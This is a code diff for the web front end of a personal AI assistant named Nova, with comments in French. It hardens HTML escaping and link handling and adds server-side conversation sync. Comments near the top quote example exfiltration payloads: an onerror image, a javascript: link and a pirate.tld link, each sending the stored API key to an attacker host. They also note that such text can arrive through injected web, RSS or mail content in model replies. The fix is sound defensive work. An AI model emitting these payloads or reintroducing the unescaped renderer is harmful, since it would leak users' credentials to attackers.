@@ -554,13 +554,46 @@ function wake(v){ if(woke || !v || !v.trim()) return; woke=true;
   const t=document.getElementById("hintTxt"); if(t) t.textContent="Nova se réveille…"; }
 function keydown(e){ if(e.key==="Enter"&&!e.shiftKey){ e.preventDefault(); ask(); } }
 function quick(el){ document.getElementById("in").value=el.textContent; ask(); }
-function esc(s){ return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+// ⚠️ DÉFAUT CRITIQUE. esc() n'échappait QUE &, < et > : le guillemet double
+// survivait, et fmt() le recollait ensuite AU MILIEU d'un attribut HTML. Une
+// réponse contenant « ![x](a"/onerror="location='https://pirate/?k='+localStorage.nova_key) »
+// produisait donc un vrai attribut onerror. Comme src="a" échoue toujours, il
+// partait TOUT SEUL, sans le moindre clic — et la clé AGENT_API_KEY quittait
+// l'iPhone. Or ce texte n'a pas besoin d'être écrit par Lohan : fmt() rend aussi
+// les réponses qui citent une page web, un flux RSS ou un mail (le canal identifié
+// à l'audit précédent), et les résultats d'automatisation.
+function esc(s){ return String(s==null?"":s)
+  .replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")
+  .replace(/"/g,"&quot;").replace(/'/g,"&#39;"); }
+
+// Une URL qu'on s'apprête à poser dans un attribut. Le texte est DÉJÀ échappé (donc
+// plus aucun guillemet ne peut fermer l'attribut) ; il reste à refuser les protocoles
+// qui exécutent du code — « [clique ici](javascript:location=…+localStorage.nova_key) »
+// demandait un clic, mais fonctionnait.
+function urlSure(u){
+  const v = String(u||"").trim();
+  return /^(?:https?:\/\/|\/|\.\/|#|mailto:|data:image\/)/i.test(v) ? v : "#";
+}
+
+// ⚠️ « __KEY__ » était remplacé par la clé sur TOUT le texte, avant le moindre
+// contrôle : « [Télécharger le PDF](https://pirate.tld/d?t=__KEY__) » rendait un lien
+// d'apparence normale contenant la clé en clair. On ne la met donc que dans une URL
+// de NOTRE serveur ; ailleurs, le marqueur est simplement retiré.
+function poseCle(t){
+  return String(t).replace(/[^\s"'<>()]*__KEY__[^\s"'<>()]*/g, (url) => {
+    const nous = url.startsWith("/") || url.startsWith("?") || url.startsWith(ORIGIN);
+    return url.split("__KEY__").join(nous ? encodeURIComponent(KEY) : "");
+  });
+}
+
 function fmt(s){
-  let t=String(s==null?"":s).split("__KEY__").join(encodeURIComponent(KEY));   // liens de fichiers
+  let t=poseCle(String(s==null?"":s));                                        // liens de fichiers
   t=esc(t).replace(/```([\s\S]*?)```/g,(m,c)=>"<pre>"+c.trim()+"</pre>");
   // Images produites par Nova : ![alt](url) → aperçu cliquable
-  t=t.replace(/!\[[^\]]*\]\(([^)]+)\)/g, (m,u)=>'<a href="'+u+'" target="_blank" class="imgw"><img src="'+u+'" alt="visuel"></a>');
-  t=t.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" target="_blank">$1</a>');   // liens markdown
+  t=t.replace(/!\[[^\]]*\]\(([^)]+)\)/g, (m,u)=>{ const a=urlSure(u);
+    return '<a href="'+a+'" target="_blank" class="imgw"><img src="'+a+'" alt="visuel"></a>'; });
+  t=t.replace(/\[([^\]]+)\]\(([^)]+)\)/g, (m,txt,u)=>
+    '<a href="'+urlSure(u)+'" target="_blank">'+txt+'</a>');                  // liens markdown
   return t.replace(/\*\*(.+?)\*\*/g,"<b>$1</b>")
           // *italique* à une astérisque : les modèles l'utilisent autant que _ceci_
           // et il s'affichait avec ses astérisques (« *Mario Kart World* »).
@@ -597,7 +630,65 @@ function attachReason(bubble,trace){ if(!trace||!trace.length) return; const col
 /* ═══ SESSIONS de conversation (façon Claude) ═══ */
 let SESSIONS=[], curId=null;
 function uid(){ return "s"+Date.now()+Math.floor(Math.random()*10000); }
-function saveSessions(){ try{ localStorage.setItem("nova_sessions",JSON.stringify(SESSIONS.slice(0,60))); localStorage.setItem("nova_cur",curId||""); }catch(e){} }
+
+/* ⚠️ Les conversations ne vivaient QUE dans le localStorage : un localStorage
+   appartient à UN navigateur sur UN appareil. L'iPhone et l'ordinateur avaient
+   chacun leur historique et ne voyaient jamais celui de l'autre ; vider le cache
+   effaçait tout. Elles sont désormais déposées sur le serveur, le localStorage ne
+   servant plus que de cache pour un affichage instantané et pour le hors-ligne. */
+let _envoiSession = null, _aEnvoyer = new Set();
+
+function saveSessions(){
+  try{ localStorage.setItem("nova_sessions",JSON.stringify(SESSIONS.slice(0,60)));
+       localStorage.setItem("nova_cur",curId||""); }catch(e){}
+  if(curId) _aEnvoyer.add(curId);
+  planifierSync();
+}
+
+// Groupé : on ne déclenche pas un aller-retour réseau à chaque touche du clavier.
+function planifierSync(){
+  if(_envoiSession) return;
+  _envoiSession = setTimeout(async () => {
+    _envoiSession = null;
+    const ids = [..._aEnvoyer]; _aEnvoyer.clear();
+    if(!KEY) return;
+    for(const id of ids){
+      const s = SESSIONS.find(x => x.id === id);
+      if(!s || !s.messages.length) continue;       // une conversation vide n'a rien à dire
+      try{
+        await fetch(ORIGIN+"/agent/sessions",{method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({key:KEY, session:{
+            id:s.id, title:s.title, ts:s.ts, messages:s.messages}})});
+      }catch(e){ _aEnvoyer.add(id); }             // hors-ligne : on retentera
+    }
+  }, 1500);
+}
+
+// Le serveur fait foi, mais on ne jette JAMAIS une conversation locale : on garde,
+// pour chaque identifiant, la version la plus récemment touchée.
+async function syncSessions(){
+  if(!KEY) return;
+  try{
+    const r = await fetch(ORIGIN+"/agent/sessions?key="+encodeURIComponent(KEY),{cache:"no-store"});
+    if(!r.ok) return;
+    const d = await r.json();
+    const par = new Map();
+    for(const s of SESSIONS) par.set(s.id, s);
+    for(const s of (d.sessions||[])){
+      const local = par.get(s.id);
+      if(!local || (s.ts||0) > (local.ts||0)) par.set(s.id, s);
+    }
+    SESSIONS = [...par.values()].sort((a,b)=>(b.ts||0)-(a.ts||0));
+    // Ce que le serveur n'a pas encore vu part maintenant.
+    for(const s of SESSIONS)
+      if(s.messages && s.messages.length && !(d.sessions||[]).some(x=>x.id===s.id))
+        _aEnvoyer.add(s.id);
+    if(_aEnvoyer.size) planifierSync();
+    try{ localStorage.setItem("nova_sessions",JSON.stringify(SESSIONS.slice(0,60))); }catch(e){}
+    renderSessions();
+  }catch(e){}
+}
 function curSess(){ return SESSIONS.find(s=>s.id===curId); }
 function newSessionObj(){ const s={id:uid(),title:"Nouvelle conversation",ts:Date.now(),messages:[]}; SESSIONS.unshift(s); curId=s.id; return s; }
 function loadSessions(){ try{ SESSIONS=JSON.parse(localStorage.getItem("nova_sessions")||"[]"); }catch(e){ SESSIONS=[]; }
@@ -609,7 +700,10 @@ function loadSessions(){ try{ SESSIONS=JSON.parse(localStorage.getItem("nova_ses
   const vide = SESSIONS.find(s => !s.messages.length);
   if(vide){ curId = vide.id; SESSIONS = [vide, ...SESSIONS.filter(s => s.id !== vide.id)]; }
   else newSessionObj();
-  saveSessions(); }
+  saveSessions();
+  // L'affichage local est immédiat ; la fusion avec le serveur arrive juste après,
+  // pour que les conversations du téléphone apparaissent aussi sur l'ordinateur.
+  syncSessions(); }
 function histPush(role,text){ const s=curSess(); if(!s) return; s.messages.push({role,text}); s.ts=Date.now();
   if(s.title==="Nouvelle conversation" && role==="me") s.title=coupeSure(text,42);   // provisoire
   saveSessions(); renderSessions();
@@ -643,7 +737,13 @@ function renderSessions(){ const el=document.getElementById("sblist"); if(!el) r
 function newSession(){ newSessionObj(); saveSessions(); renderChat(); renderSessions(); closeSidebar(); }
 function switchSession(id){ curId=id; saveSessions(); renderChat(); renderSessions(); closeSidebar(); }
 function deleteSession(id,ev){ if(ev)ev.stopPropagation(); SESSIONS=SESSIONS.filter(s=>s.id!==id);
-  if(!SESSIONS.length) newSessionObj(); if(curId===id) curId=SESSIONS[0].id; saveSessions(); renderChat(); renderSessions(); }
+  if(!SESSIONS.length) newSessionObj(); if(curId===id) curId=SESSIONS[0].id;
+  // Supprimer aussi côté serveur, sinon la conversation revenait à la prochaine
+  // synchronisation — et sur l'autre appareil elle n'aurait jamais disparu.
+  if(KEY) fetch(ORIGIN+"/agent/sessions?key="+encodeURIComponent(KEY)
+                +"&id="+encodeURIComponent(id),{method:"DELETE"}).catch(()=>{});
+  _aEnvoyer.delete(id);
+  saveSessions(); renderChat(); renderSessions(); }
 function toggleSidebar(){ const sb=document.getElementById("sidebar"), sc=document.getElementById("scrim");
   const on=!sb.classList.contains("show"); sb.classList.toggle("show",on); sc.classList.toggle("show",on); if(on){ renderSessions(); sndOpen(); } }
 function closeSidebar(){ document.getElementById("sidebar").classList.remove("show"); document.getElementById("scrim").classList.remove("show"); }
@@ -1578,7 +1678,15 @@ async function diagReste(){
       h += "<br><span style='opacity:.6;font-size:12px'>· "+txt(e.titre)+" → "+txt(e.issue)+"</span>";
     return h;
   });
-  return mem + "<br><br>" + auto;
+  // ⚠️ Les conversations vivaient dans le navigateur : le téléphone et l'ordinateur
+  // avaient chacun les leurs. Ce bloc dit si elles sont réellement partagées.
+  const conv = await diagBloc("💬 Conversations", "/agent/diag/sessions", c => {
+    let h = txt(c.resume);
+    if(c.solution) h += "<br><span style='opacity:.75;font-size:13px'>👉 "+txt(c.solution)+"</span>";
+    return h + "<br><span style='opacity:.55;font-size:12px'>"+txt(c.conversations)
+      +" conversation(s) · "+txt(c.ou)+"</span>";
+  });
+  return mem + "<br><br>" + conv + "<br><br>" + auto;
 }
 
 /* ═══ MOT-CLÉ « NOVA » (mains-libres, tant que la page est ouverte) ═══ */
